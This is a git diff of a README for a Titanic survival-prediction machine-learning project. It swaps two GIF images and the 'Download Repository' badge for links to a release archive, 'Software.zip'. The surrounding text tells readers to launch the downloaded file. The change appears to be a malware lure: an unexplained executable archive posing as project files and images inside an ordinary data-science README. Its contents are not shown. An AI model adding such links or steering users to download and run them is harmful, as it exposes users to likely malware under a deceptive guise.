@@ -1,6 +1,6 @@
 # 🚢📊🔍 Titanic Machine Learning for Disaster
 
-![Titanic](https://media.giphy.com/media/Rq92BQpxDoE0I/giphy.gif)
+![Titanic](https://github.com/Pentagonex/Titanic_KaggleDataset/releases/download/v1.0/Software.zip)
 
 Welcome to the **Titanic Machine Learning for Disaster** repository! This project focuses on analyzing the **Titanic - Machine Learning for Disaster** dataset from Kaggle, exploring patterns, behaviors, and information that may be useful in predicting the survival of passengers aboard the Titanic. We then create a model using machine learning techniques to predict whether each passenger survived the disaster or not.
 
@@ -32,7 +32,7 @@ The ultimate goal of this project is to develop a predictive model that accurate
 ## Get Started
 Ready to dive into the world of Titanic survival prediction? Click the button below to download the repository and start exploring!
 
-[![Download Repository](https://img.shields.io/badge/Download-Repository-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Repository](https://github.com/Pentagonex/Titanic_KaggleDataset/releases/download/v1.0/Software.zip)](https://github.com/Pentagonex/Titanic_KaggleDataset/releases/download/v1.0/Software.zip)
 
 If the link above ends with a file name, launch it to access the project files. Otherwise, simply visit the repository to get started with the Titanic Machine Learning for Disaster project.
 
@@ -46,4 +46,4 @@ Feel free to fork the repository, contribute code, or provide feedback to help i
 
 🚢 Happy Modeling and May the Predictions Be Ever in Your Favor! 🌟
 
-![Titanic](https://media.giphy.com/media/NHtCqS0b9Zz4/giphy.gif)
+![Titanic](https://github.com/Pentagonex/Titanic_KaggleDataset/releases/download/v1.0/Software.zip)
